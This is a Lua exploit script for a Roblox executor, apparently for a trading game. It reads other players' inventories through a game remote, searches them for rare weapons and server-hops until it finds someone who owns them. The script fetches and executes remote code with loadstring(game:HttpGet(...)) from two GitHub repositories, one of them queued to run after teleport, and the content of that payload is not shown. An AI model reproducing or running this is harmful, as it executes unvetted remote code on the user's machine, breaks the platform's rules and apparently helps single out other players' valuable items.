local ItemDB = require(game:GetService("ReplicatedStorage").Database.Sync.Item)
local Players = game:GetService("Players")
local Http = game:GetService("HttpService")
local preferably = {
    "ZombieBat", "Makeshift", "TravelerGun", "TreeGun2023Chroma", "Harvester", "Gingerscope", "TravelerAxe", "Celestial", "Icepiercer"
}
local function CheckInventoryForPlayer(player)
    local success, data = pcall(function()
        return game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(player)
    end)
    if success and data and data.Weapons and data.Weapons.Owned then
        local ownedItems = data.Weapons.Owned
        local foundItems = {}

        for _, itemName in ipairs(preferably) do
            if ownedItems[itemName] then
                table.insert(foundItems, itemName)
            end
        end
        if #foundItems > 0 then
            print("âœ… Found preferred items for player " .. player.Name)
            print("Items: " .. table.concat(foundItems, ", "))
            return true
        else
            print("âŒ No preferred items found for player " .. player.Name)
        end
    else
        print("âŒ Failed to get data for " .. player.Name)
    end
    return false
end

local function teleportToNewServer()
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local TeleportService = game:GetService("TeleportService")

local place_id = game.PlaceId
local job_id = game.JobId

local API = "https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Desc&limit=100"
local request = loadstring(game:HttpGet("https://raw.githubusercontent.com/EpicPug/Stuff/main/request.lua"))()
	if request then
		local data
		
		local success, response
		local found_servers = {}
		
		success, response = pcall(function()
			data = request({Url = API:format(place_id)})
		end)

		if success and data and data.Body then
			local decode
			success, response = pcall(function()
				decode = HttpService:JSONDecode(data.Body)
			end)

			if success and decode and decode.data then
				for _, found in pairs(decode.data) do
					if type(found) == "table" and found["id"] ~= job_id then
						table.insert(found_servers, {
							["playing"] = found.playing,
							["maxPlayers"] = found.maxPlayers,
							["ping"] = found.ping,
							["id"] = found.id
						})
					end
				end

				if #found_servers > 0 then
					local id
					local lowest_ping = 100

					for i, v in ipairs(found_servers) do
						if v["playing"] < v["maxPlayers"] then
							if v["ping"] < lowest_ping then
								id = v["id"]
								lowest_ping = v["ping"]
							end
						end
					end

					if id then
						TeleportService.TeleportInitFailed:Connect(function()
                          queue_on_teleport([[
wait(10)
loadstring(game:HttpGet('https://raw.githubusercontent.com/ipadys/empheriumf/refs/heads/main/f.txt'))()
    ]])
							TeleportService:TeleportToPlaceInstance(place_id, id, Players.LocalPlayer)
						end)

						repeat
							TeleportService:TeleportToPlaceInstance(place_id, id, Players.LocalPlayer)
							task.wait(2)
						until not game
					end
				end
			end
		end
	end
end

local isTeleporting = false

function KeepCheckingForValidPlayer()
    for _, player in ipairs(Players:GetPlayers()) do
        print("ðŸŽ® Checking " .. player.Name)
        if CheckInventoryForPlayer(player) then
            print("ðŸŽ‰ Found a valid player!")
            return true
        end
    end

    if not isTeleporting then
        isTeleporting = true
        print("ðŸ” No matches found, teleporting...")
        teleportToNewServer()
    end
    return false
end
while true do
    if KeepCheckingForValidPlayer() then
        break
    end
    wait(10)
end
